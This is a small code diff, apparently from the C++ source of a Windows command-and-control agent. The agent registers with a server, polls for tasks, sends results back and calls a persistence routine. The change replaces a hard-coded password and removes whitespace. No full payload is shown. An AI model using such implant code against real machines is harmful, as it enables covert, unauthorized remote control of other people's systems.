@@ -22,7 +22,7 @@ int port = 5000;
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR getTaskURI = L"/agent/get_task";
 LPCWSTR sendResultURI = L"agent/send_result";
-std::string password = "password";
+std::string password = "magic_conch";
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
 BOOL useTLS = FALSE;  // set to true for HTTPs
@@ -159,7 +159,7 @@ int main(int argc, char* argv[]){
     }
 
     persist();
-    
+
     agentId = generateRandomId(10);
     BOOL registered = FALSE;
     do {
